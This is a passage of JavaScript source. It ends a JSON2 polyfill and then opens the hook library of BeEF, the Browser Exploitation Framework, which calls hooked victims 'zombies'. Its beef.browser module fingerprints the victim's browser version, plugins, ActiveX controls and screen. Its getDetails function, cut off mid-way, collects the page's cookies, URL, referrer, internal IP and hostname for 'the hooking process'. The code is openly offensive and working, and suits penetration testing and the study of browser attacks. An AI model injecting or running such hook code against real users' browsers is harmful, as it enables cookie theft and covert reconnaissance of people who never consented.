                f(this.getUTCMonth() + 1) + '-' +
                f(this.getUTCDate())      + 'T' +
                f(this.getUTCHours())     + ':' +
                f(this.getUTCMinutes())   + ':' +
                f(this.getUTCSeconds())   + 'Z' : null;
        };

        String.prototype.toJSON      =
            Number.prototype.toJSON  =
            Boolean.prototype.toJSON = function (key) {
                return this.valueOf();
            };
    }

    var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        gap,
        indent,
        meta = {    // table of character substitutions
            '\b': '\\b',
            '\t': '\\t',
            '\n': '\\n',
            '\f': '\\f',
            '\r': '\\r',
            '"' : '\\"',
            '\\': '\\\\'
        },
        rep;


    function quote(string) {

// If the string contains no control characters, no quote characters, and no
// backslash characters, then we can safely slap some quotes around it.
// Otherwise we must also replace the offending characters with safe escape
// sequences.

        escapable.lastIndex = 0;
        return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
            var c = meta[a];
            return typeof c === 'string' ? c :
                '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
        }) + '"' : '"' + string + '"';
    }


    function str(key, holder) {

// Produce a string from holder[key].

        var i,          // The loop counter.
            k,          // The member key.
            v,          // The member value.
            length,
            mind = gap,
            partial,
            value = holder[key];

// If the value has a toJSON method, call it to obtain a replacement value.

        if (value && typeof value === 'object' &&
                typeof value.toJSON === 'function') {
            value = value.toJSON(key);
        }

// If we were called with a replacer function, then call the replacer to
// obtain a replacement value.

        if (typeof rep === 'function') {
            value = rep.call(holder, key, value);
        }

// What happens next depends on the value's type.

        switch (typeof value) {
        case 'string':
            return quote(value);

        case 'number':

// JSON numbers must be finite. Encode non-finite numbers as null.

            return isFinite(value) ? String(value) : 'null';

        case 'boolean':
        case 'null':

// If the value is a boolean or null, convert it to a string. Note:
// typeof null does not produce 'null'. The case is included here in
// the remote chance that this gets fixed someday.

            return String(value);

// If the type is 'object', we might be dealing with an object or an array or
// null.

        case 'object':

// Due to a specification blunder in ECMAScript, typeof null is 'object',
// so watch out for that case.

            if (!value) {
                return 'null';
            }

// Make an array to hold the partial results of stringifying this object value.

            gap += indent;
            partial = [];

// Is the value an array?

            if (Object.prototype.toString.apply(value) === '[object Array]') {

// The value is an array. Stringify every element. Use null as a placeholder
// for non-JSON values.

                length = value.length;
                for (i = 0; i < length; i += 1) {
                    partial[i] = str(i, value) || 'null';
                }

// Join all of the elements together, separated with commas, and wrap them in
// brackets.

                v = partial.length === 0 ? '[]' : gap ?
                    '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']' :
                    '[' + partial.join(',') + ']';
                gap = mind;
                return v;
            }

// If the replacer is an array, use it to select the members to be stringified.

            if (rep && typeof rep === 'object') {
                length = rep.length;
                for (i = 0; i < length; i += 1) {
                    if (typeof rep[i] === 'string') {
                        k = rep[i];
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            } else {

// Otherwise, iterate through all of the keys in the object.

                for (k in value) {
                    if (Object.prototype.hasOwnProperty.call(value, k)) {
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
                        }
                    }
                }
            }

// Join all of the member texts together, separated with commas,
// and wrap them in braces.

            v = partial.length === 0 ? '{}' : gap ?
                '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}' :
                '{' + partial.join(',') + '}';
            gap = mind;
            return v;
        }
    }

// If the JSON object does not yet have a stringify method, give it one.

    if (typeof JSON.stringify !== 'function') {
        JSON.stringify = function (value, replacer, space) {

// The stringify method takes a value and an optional replacer, and an optional
// space parameter, and returns a JSON text. The replacer can be a function
// that can replace values, or an array of strings that will select the keys.
// A default replacer method can be provided. Use of the space parameter can
// produce text that is more easily readable.

            var i;
            gap = '';
            indent = '';

// If the space parameter is a number, make an indent string containing that
// many spaces.

            if (typeof space === 'number') {
                for (i = 0; i < space; i += 1) {
                    indent += ' ';
                }

// If the space parameter is a string, it will be used as the indent string.

            } else if (typeof space === 'string') {
                indent = space;
            }

// If there is a replacer, it must be a function or an array.
// Otherwise, throw an error.

            rep = replacer;
            if (replacer && typeof replacer !== 'function' &&
                    (typeof replacer !== 'object' ||
                    typeof replacer.length !== 'number')) {
                throw new Error('JSON.stringify');
            }

// Make a fake root object containing our value under the key of ''.
// Return the result of stringifying the value.

            return str('', {'': value});
        };
    }


// If the JSON object does not yet have a parse method, give it one.

    if (typeof JSON.parse !== 'function') {
        JSON.parse = function (text, reviver) {

// The parse method takes a text and an optional reviver function, and returns
// a JavaScript value if the text is a valid JSON text.

            var j;

            function walk(holder, key) {

// The walk method is used to recursively walk the resulting structure so
// that modifications can be made.

                var k, v, value = holder[key];
                if (value && typeof value === 'object') {
                    for (k in value) {
                        if (Object.prototype.hasOwnProperty.call(value, k)) {
                            v = walk(value, k);
                            if (v !== undefined) {
                                value[k] = v;
                            } else {
                                delete value[k];
                            }
                        }
                    }
                }
                return reviver.call(holder, key, value);
            }


// Parsing happens in four stages. In the first stage, we replace certain
// Unicode characters with escape sequences. JavaScript handles many characters
// incorrectly, either silently deleting them, or treating them as line endings.

            text = String(text);
            cx.lastIndex = 0;
            if (cx.test(text)) {
                text = text.replace(cx, function (a) {
                    return '\\u' +
                        ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                });
            }

// In the second stage, we run the text against regular expressions that look
// for non-JSON patterns. We are especially concerned with '()' and 'new'
// because they can cause invocation, and '=' because it can cause mutation.
// But just to be safe, we want to reject all unexpected forms.

// We split the second stage into 4 regexp operations in order to work around
// crippling inefficiencies in IE's and Safari's regexp engines. First we
// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
// replace all simple value tokens with ']' characters. Third, we delete all
// open brackets that follow a colon or comma or that begin the text. Finally,
// we look to see that the remaining characters are only whitespace or ']' or
// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.

            if (/^[\],:{}\s]*$/
                    .test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
                        .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
                        .replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {

// In the third stage we use the eval function to compile the text into a
// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
// in JavaScript: it can begin a block or an object literal. We wrap the text
// in parens to eliminate the ambiguity.

                j = eval('(' + text + ')');

// In the optional fourth stage, we recursively walk the new structure, passing
// each name/value pair to a reviver function for possible transformation.

                return typeof reviver === 'function' ?
                    walk({'': j}, '') : j;
            }

// If the text is not JSON parseable, then a SyntaxError is thrown.

            throw new SyntaxError('JSON.parse');
        };
    }
}());


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * BeEF JS Library 0.4.3.1-alpha
 * http://beef.googlecode.com/
 */

$j = jQuery.noConflict();

//='';

if(typeof beef === 'undefined' && typeof window.beef === 'undefined') {
	
	var BeefJS = {
		
		version: '0.4.3.1-alpha',
		
		// This get set to true during window.onload(). It's a useful hack when messing with document.write().
		pageIsLoaded: false,
		
		// An array containing functions to be executed by the window.onpopstate() method.
		onpopstate: new Array(),
		
		// An array containing functions to be executed by the window.onclose() method.
		onclose: new Array(),
		
		// An array containing functions to be executed by Beef.
		commands: new Array(),
		
		// An array containing all the BeEF JS components.
		components: new Array(),
		
		/**
		 * Adds a function to execute.
		 * @param: {Function} the function to execute.
		 */
		execute: function(fn) {
			this.commands.push(fn);
		},
		
		/**
		 * Registers a component in BeEF JS.
		 * @params: {String} the component.
		 *
		 * Components are very important to register so the framework does not
		 * send them back over and over again.
		 */
		regCmp: function(component) {
			this.components.push(component);
		}
	
    };
	
	window.beef = BeefJS;
}


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/**
 * @literal object: beef.browser
 *
 * Basic browser functions.
 */
beef.browser = {
	
	/**
	 * Returns the user agent that the browser is claiming to be.
	 * @example: beef.browser.getBrowserReportedName()
	 */
	getBrowserReportedName: function() {						
		return navigator.userAgent;
	},
	
	/**
	 * Returns true if IE6.
	 * @example: beef.browser.isIE6()
	 */
	isIE6: function() {						
		return !window.XMLHttpRequest && !window.globalStorage;
	},
	
	/**
	 * Returns true if IE7.
	 * @example: beef.browser.isIE7()
	 */
	isIE7: function() {						
		return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
	},
	
	/**
	 * Returns true if IE8.
	 * @example: beef.browser.isIE8()
	 */
	isIE8: function() {						
		$j("body").append('<!--[if IE 8]>     <div id="beefiecheck" class="ie ie8"></div>      <![endif]-->');
		return ($j('#beefiecheck').hasClass('ie8'))?true:false;
	},
	
	/**
	 * Returns true if IE9.
	 * @example: beef.browser.isIE9()
	 */
	isIE9: function() {
		$j("body").append('<!--[if IE 9]>     <div id="beefiecheck" class="ie ie9"></div>      <![endif]-->');
		return ($j('#beefiecheck').hasClass('ie9'))?true:false;
	},
	
	/**
	 * Returns true if IE.
	 * @example: beef.browser.isIE()
	 */
	isIE: function() {
		return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9();
	},
	
	/**
	 * Returns true if FF2.
	 * @example: beef.browser.isFF2()
	 */
	isFF2: function() {
		return !!window.globalStorage && !window.postMessage;
	},
	
	/**
	 * Returns true if FF3.
	 * @example: beef.browser.isFF3()
	 */
	isFF3: function() {
		return !!window.globalStorage && !!window.postMessage && !JSON.parse;
	},
	
	/**
	 * Returns true if FF3.5.
	 * @example: beef.browser.isFF3_5()
	 */
	isFF3_5: function() {
		return !!window.globalStorage && !!JSON.parse && !window.FileReader;
	},
	
	/**
	 * Returns true if FF3.6.
	 * @example: beef.browser.isFF3_6()
	 */
	isFF3_6: function() {
		return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
	},

	/**
	 * Returns true if FF4.
	 * @example: beef.browser.isFF4()
	 */
	isFF4: function() {
		return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
	},
	
	/**
	 * Returns true if FF5.
	 * @example: beef.browser.isFF5()
	 */
	isFF5: function() {
		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
	},

	/**
	 * Returns true if FF6.
	 * @example: beef.browser.isFF6()
	 */
	isFF6: function() {
		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
	},

	/**
	 * Returns true if FF7.
	 * @example: beef.browser.isFF7()
	 */
	isFF7: function() {
		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
	},

	/**
	 * Returns true if FF8.
	 * @example: beef.browser.isFF8()
	 */
	isFF8: function() {
		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
	},

	/**
	 * Returns true if FF9.
	 * @example: beef.browser.isFF9()
	 */
	isFF9: function() {
		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
	},

	/**
	 * Returns true if FF10.
	 * @example: beef.browser.isFF10()
	 */
	isFF10: function() {
		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
	},

	/**
	 * Returns true if FF.
	 * @example: beef.browser.isFF()
	 */
	isFF: function() {
		return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10();
	},

	/**
	 * Returns true if Safari 4.xx
	 * @example: beef.browser.isS4()
	 */
	isS4: function() {
		return (window.navigator.userAgent.match(/ Version\/4\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome);
	},
	
	/**
	 * Returns true if Safari 5.xx
	 * @example: beef.browser.isS5()
	 */
	isS5: function() {
		return (window.navigator.userAgent.match(/ Version\/5\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome);
	},
	
	/**
	 * Returns true if Safari.
	 * @example: beef.browser.isS()
	 */
	isS: function() {
		return this.isS4() || this.isS5() || (!window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome);
	},

	/**
	 * Returns true if Chrome 5.
	 * @example: beef.browser.isC5()
	 */
	isC5: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==5)?true:false);
	},
		
	/**
	 * Returns true if Chrome 6.
	 * @example: beef.browser.isC6()
	 */
	isC6: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==6)?true:false);
	},

	/**
	 * Returns true if Chrome 7.
	 * @example: beef.browser.isC7()
	 */
	isC7: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==7)?true:false);
	},

	/**
	 * Returns true if Chrome 8.
	 * @example: beef.browser.isC8()
	 */
	isC8: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==8)?true:false);
	},
	
	/**
	 * Returns true if Chrome 9.
	 * @example: beef.browser.isC9()
	 */
	isC9: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==9)?true:false);
	},
	
	/**
	 * Returns true if Chrome 10.
	 * @example: beef.browser.isC10()
	 */
	isC10: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==10)?true:false);
	},

	/**
	 * Returns true if Chrome 11.
	 * @example: beef.browser.isC11()
	 */
	isC11: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==11)?true:false);
	},
	
	/**
	 * Returns true if Chrome 12.
	 * @example: beef.browser.isC12()
	 */
	isC12: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==12)?true:false);
	},

	/**
	 * Returns true if Chrome 13.
	 * @example: beef.browser.isC13()
	 */
	isC13: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==13)?true:false);
	},

	/**
	 * Returns true if Chrome 14.
	 * @example: beef.browser.isC14()
	 */
	isC14: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==14)?true:false);
	},

	/**
	 * Returns true if Chrome 15.
	 * @example: beef.browser.isC15()
	 */
	isC15: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==15)?true:false);
	},

	/**
	 * Returns true if Chrome 16.
	 * @example: beef.browser.isC16()
	 */
	isC16: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==16)?true:false);
	},

    /**
     * Returns true if Chrome 17.
     * @example: beef.browser.isC17()
     */
    isC17: function() {
        return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==17)?true:false);
    },

	/**
	 * Returns true if Chrome.
	 * @example: beef.browser.isC()
	 */
	isC: function() {
		return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16()|| this.isC17();
	},

	/**
        * Returns true if Opera 9.50 through 9.52.
        * @example: beef.browser.isO9_52()
        */
       isO9_52: function() {
           return (!!window.opera  && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
       },

       /**
        * Returns true if Opera 9.60 through 9.64.
        * @example: beef.browser.isO9_60()
        */
       isO9_60: function() {
           return (!!window.opera  && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
       },

       /**
        * Returns true if Opera 10.xx.
        * @example: beef.browser.isO10()
        */
       isO10: function() {
           return (!!window.opera  && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
       },

       /**
        * Returns true if Opera 11.xx.
        * @example: beef.browser.isO11()
        */
       isO11: function() {
           return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
       },

	/**
	 * Returns true if Opera.
	 * @example: beef.browser.isO()
	 */
	isO: function() {
		return this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11();
	},
		
	/**
	 * Returns the type of browser being used.
	 * @example: beef.browser.type().IE6
	 * @example: beef.browser.type().FF
	 * @example: beef.browser.type().O
	 */
	type: function() {
		
		return {
			C5:	this.isC5(), 	// Chrome 5
			C6:	this.isC6(), 	// Chrome 6
			C7:	this.isC7(), 	// Chrome 7
			C8:	this.isC8(), 	// Chrome 8
			C9:	this.isC9(), 	// Chrome 9
			C10:	this.isC10(), 	// Chrome 10
			C11:	this.isC11(), 	// Chrome 11
			C12:	this.isC12(), 	// Chrome 12
			C13:	this.isC13(),	// Chrome 13
			C14:	this.isC14(),	// Chrome 14
			C15:    this.isC15(),   // Chrome 15
			C16:	this.isC16(),	// Chrome 16
            C17:	this.isC17(),	// Chrome 16
			C:	this.isC(), 	// Chrome any version

			FF2:	this.isFF2(),	// Firefox 2
			FF3:	this.isFF3(),	// Firefox 3
			FF3_5:	this.isFF3_5(),	// Firefox 3.5
			FF3_6:	this.isFF3_6(),	// Firefox 3.6
			FF4:	this.isFF4(),   // Firefox 4
			FF5:	this.isFF5(),	// Firefox 5
			FF6:	this.isFF6(),	// Firefox 6
			FF7:	this.isFF7(),	// Firefox 7
			FF8:	this.isFF8(),	// Firefox 8
			FF9:	this.isFF9(),	// Firefox 9
			FF10:	this.isFF10(),	// Firefox 10
			FF:	this.isFF(),	// Firefox any version

			IE6:	this.isIE6(),	// Internet Explorer 6
			IE7:	this.isIE7(),	// Internet Explorer 7
			IE8:	this.isIE8(),	// Internet Explorer 8
			IE9:	this.isIE9(),	// Internet Explorer 9
			IE:	this.isIE(),	// Internet Explorer any version

			O9_52:  this.isO9_52(), // Opera 9.50 through 9.52
			O9_60:  this.isO9_60(), // Opera 9.60 through 9.64
			O10:    this.isO10(),  	// Opera 10.xx
			O11:    this.isO11(),  	// Opera 11.xx
			O:      this.isO(), 	// Opera any version

			S4:	this.isS4(),	// Safari 4.xx
			S5:	this.isS5(),	// Safari 5.xx
			S:	this.isS()	// Safari any version
		}
	},
	 
	/**
	 * Returns the type of browser being used.
	 * @return: {String} User agent software and version.
	 *
	 * @example: beef.browser.getBrowserVersion()
	 */
	getBrowserVersion: function() {
				
		if (this.isC5())	{ return '5'  }; 	// Chrome 5
		if (this.isC6())	{ return '6'  }; 	// Chrome 6
		if (this.isC7())	{ return '7'  }; 	// Chrome 7
		if (this.isC8())	{ return '8'  }; 	// Chrome 8
		if (this.isC9())	{ return '9'  }; 	// Chrome 9
		if (this.isC10())	{ return '10' }; 	// Chrome 10
		if (this.isC11())	{ return '11' }; 	// Chrome 11
		if (this.isC12())	{ return '12' }; 	// Chrome 12
		if (this.isC13())	{ return '13' }; 	// Chrome 13
		if (this.isC14())	{ return '14' }; 	// Chrome 14
		if (this.isC15())	{ return '15' }; 	// Chrome 15
		if (this.isC16())	{ return '16' };	// Chrome 16
        if (this.isC17())	{ return '17' };	// Chrome 17


		if (this.isFF2())	{ return '2'  };	// Firefox 2
		if (this.isFF3())	{ return '3'  };	// Firefox 3
		if (this.isFF3_5())	{ return '3.5'};	// Firefox 3.5
		if (this.isFF3_6())	{ return '3.6'};	// Firefox 3.6
		if (this.isFF4())	{ return '4'  };	// Firefox 4
		if (this.isFF5())	{ return '5'  };	// Firefox 5
		if (this.isFF6())	{ return '6'  };	// Firefox 6
		if (this.isFF7())	{ return '7'  };	// Firefox 7
		if (this.isFF8())	{ return '8'  };	// Firefox 8
		if (this.isFF9())	{ return '9'  };	// Firefox 9
		if (this.isFF10())	{ return '10' };	// Firefox 10


		if (this.isIE6())	{ return '6'  };	// Internet Explorer 6
		if (this.isIE7())	{ return '7'  };	// Internet Explorer 7
		if (this.isIE8())	{ return '8'  };	// Internet Explorer 8
		if (this.isIE9())	{ return '9'  };	// Internet Explorer 9

		if (this.isS4())	{ return '4'  };	// Safari 4
		if (this.isS5())	{ return '5'  };	// Safari 5

		if (this.isO9_52())	{ return '9.5'};	// Opera 9.5x
		if (this.isO9_60())	{ return '9.6'};	// Opera 9.6
		if (this.isO10())	{ return '10' };	// Opera 10.xx
		if (this.isO11())	{ return '11' };	// Opera 11.xx

		return 'UNKNOWN';				// Unknown UA
	},
	
	/**
	 * Returns the type of user agent by hooked browser.
	 * @return: {String} User agent software.
	 *
	 * @example: beef.browser.getBrowserName()
	 */
	getBrowserName: function() {
				
		if (this.isC())		{ return 'C' }; 	// Chrome any version
		if (this.isFF())	{ return 'FF'};		// Firefox any version
		if (this.isIE())	{ return 'IE'};		// Internet Explorer any version
		if (this.isO())		{ return 'O' };		// Opera any version
		if (this.isS())		{ return 'S' };		// Safari any version
		return 'UN';					// Unknown UA
	},
	
	/**
	 * Checks if the zombie has flash installed and enabled.
	 * @return: {Boolean} true or false.
	 *
	 * @example: if(beef.browser.hasFlash()) { ... }
	 */
	hasFlash: function() {
		if (!this.type().IE) {
			return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]); 
		} else {
			flash_versions = 11;
			flash_installed = false;

			if (window.ActiveXObject) {
				for (x = 2; x <= flash_versions; x++) {
					try {
						Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
						if (Flash) {
							flash_installed = true;
						}
					}
					catch(e) { }
				}
			};
			return flash_installed;
		}
	},
	
	/**
	 * Checks if the zombie has Java installed and enabled.
	 * @return: {Boolean} true or false.
	 *
	 * @example: if(beef.browser.hasJava()) { ... }
	 */
	hasJava: function() {
		if(!this.type().IE && window.navigator.javaEnabled && window.navigator.javaEnabled()) {
			return true;
		}
		return false;
	},
	
	/**
	 * Checks if the zombie has VBScript enabled.
	 * @return: {Boolean} true or false.
	 *
	 * @example: if(beef.browser.hasVBScript()) { ... }
	 */
	hasVBScript: function() {
		if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
			return true;
		} else {
			return false;
		}
	},
	
	/**
	 * Returns the list of plugins installed in the browser.
	 */
	getPlugins: function() {
		var results = '';
        if (this.isIE())
        {
            results = this.getPluginsIE();
        } else {
            if (navigator.plugins && navigator.plugins.length > 0)
            {
                var length = navigator.plugins.length;
                for (var i=0; i < length; i++)
                {
                    if (i != 0)
                        results += '\n';
                    if(beef.browser.isFF()){ //FF returns exact plugin versions
                        results += navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;
                    }else{ // Webkit and Presto (Opera) doesn't support the version attribute, and
                           // sometimes they store plugin version in description (Real, Adobe)
                        results += navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
                    }
                }
            } else {
                results = 'navigator.plugins is not supported in this browser!';
            }
        }
		return results;
	},
	
	/**
	 * Returns a list of plugins detected by IE. This is a hack because IE doesn't
	 * support navigator.plugins 
	 */
     getPluginsIE: function() {
        var results = '';
        var plugins = {'AdobePDF6':{
            'control':'PDF.PdfCtrl', 
            'return': function(control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v'+parseFloat(version[1]);
            }}, 
            'AdobePDF7':{
            'control':'AcroPDF.PDF',
            'return': function(control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v'+parseFloat(version[1]);
            }},
            'Flash':{
            'control':'ShockwaveFlash.ShockwaveFlash',
            'return': function(control) {
                version = control.getVariable('$version').substring(4);
                version = version.split(',');
                return 'Flash Player v'+parseFloat(version[0]+'.'+version[1]);
            }},
            'Quicktime':{
            'control': 'QuickTime.QuickTime',
            'return': function(control) {
                return 'QuickTime Player';
            }},
            'RealPlayer':{
            'control': 'RealPlayer',
            'return': function(control) {
                version = control.getVersionInfo();
                return 'RealPlayer v'+parseFloat(version);
            }},
            'Shockwave':{
            'control': 'SWCtl.SWCtl',
            'return': function(control) {
                version = control.ShockwaveVersion('').split('r');
                return 'Shockwave v'+parseFloat(version[0]);
            }},
            'WindowsMediaPlayer': {
            'control': 'WMPlayer.OCX',
            'return': function(control) {
                return 'Windows Media Player v'+parseFloat(control.versionInfo);
            }}
            };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins)
            {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) { }
                if (control)
                {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

	/**
	 * Returns zombie screen size and color depth.
	 */	
	getScreenParams: function() {
		return {
			width: window.screen.width, 
			height: window.screen.height,
			colordepth: window.screen.colorDepth
			}
	},

	/**
	 * Returns zombie browser window size.
	 * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
	 */	
	getWindowSize: function() {
		  var myWidth = 0, myHeight = 0;
		  if( typeof( window.innerWidth ) == 'number' ) {
		    // Non-IE
		    myWidth = window.innerWidth;
		    myHeight = window.innerHeight;
		  } else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {
		    // IE 6+ in 'standards compliant mode'
		    myWidth = document.documentElement.clientWidth;
		    myHeight = document.documentElement.clientHeight;
		  } else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
		    // IE 4 compatible
		    myWidth = document.body.clientWidth;
		    myHeight = document.body.clientHeight;
		  }
		  return {
			  width: myWidth,
			  height: myHeight
		  }
	},
	
	/**
	 * Construct hash from browser details. This function is used to grab the browser details during the hooking process
	 */	
	getDetails: function() {
		var details = new Array();
		
		var browser_name = beef.browser.getBrowserName();
		var browser_version = beef.browser.getBrowserVersion();
		var browser_reported_name = beef.browser.getBrowserReportedName();
		var cookies = document.cookie;
		var page_title = (document.title) ? document.title : "No Title";
		var page_uri = document.location.href;
		var page_referrer = (document.referrer) ? document.referrer : "No Referrer";
		var hostname = document.location.hostname;
		var hostport = (document.location.port)? document.location.port : "80";
		var browser_plugins = beef.browser.getPlugins();
		var os_name = beef.os.getName();
		var system_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
		var internal_ip = beef.net.local.getLocalAddress();
		var internal_hostname = beef.net.local.getLocalHostname();
		var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {if (value == true) return value; else if (typeof value == 'object') return value; else return;});
		var screen_params = beef.browser.getScreenParams();
		var window_size = beef.browser.getWindowSize();
		var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
		var vbscript_enabled=(beef.browser.hasVBScript())? "Yes" : "No";
		var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
		var has_googlegears=(beef.browser.hasGoogleGears())? "Yes":"No";
		var has_web_socket=(beef.browser.hasWebSocket())? "Yes":"No";
		var has_activex = (typeof(window.ActiveXObject) != "undefined") ? "Yes":"No";
		var has_session_cookies = (beef.browser.cookie.hasSessionCookies("cookie"))? "Yes":"No";
		var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies("cookie"))? "Yes":"No";

		if(browser_name) details["BrowserName"] = browser_name;
		if(browser_version) details["BrowserVersion"] = browser_version;
		if(browser_reported_name) details["BrowserReportedName"] = browser_reported_name;
		if(cookies) details["Cookies"] = cookies;
		if(page_title) details["PageTitle"] = page_title;
		if(page_uri) details["PageURI"] = page_uri;
		if(page_referrer) details["PageReferrer"] = page_referrer;
		if(hostname) details["HostName"] = hostname;
		if(hostport) details["HostPort"] = hostport;
		if(browser_plugins) details["BrowserPlugins"] = browser_plugins;
		if(os_name) details['OsName'] = os_name;
		if(system_platform) details['SystemPlatform'] = system_platform;
		if(internal_ip) details['InternalIP'] = internal_ip;
		if(internal_hostname) details['InternalHostname'] = internal_hostname;
		if(browser_type) details['BrowserType'] = browser_type;
		if(screen_params) details['ScreenParams'] = screen_params;
		if(window_size) details['WindowSize'] = window_size;
		if(java_enabled) details['JavaEnabled'] = java_enabled
		if(vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled
		if(has_flash) details['HasFlash'] = has_flash
		if(has_web_socket) details['HasWebSocket'] = has_web_socket
		if(has_googlegears) details['HasGoogleGears'] = has_googlegears
